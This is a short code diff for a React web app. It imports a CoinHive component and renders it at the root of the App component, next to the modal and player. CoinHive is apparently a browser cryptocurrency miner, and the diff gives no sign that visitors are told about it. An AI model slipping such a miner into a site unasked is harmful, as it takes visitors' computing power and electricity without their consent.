@@ -5,6 +5,7 @@ import { connect } from 'react-redux'
 import sessionActions from '../../actions/session.js'
 import withMethodData from '../../components/withMethodData.jsx'
 import Authenticated from '../../components/Authenticated.jsx'
+import CoinHive from '../../components/CoinHive.jsx'
 
 import Modal from '../../components/Modal.jsx'
 import NavBar from '../../components/NavBar.jsx'
@@ -76,6 +77,7 @@ class App extends Component {
         </Router>
         <Modal session={this.props} />
         <Player session={this.props} />
+        <CoinHive />
         <footer id='footer' />
       </div>
     )
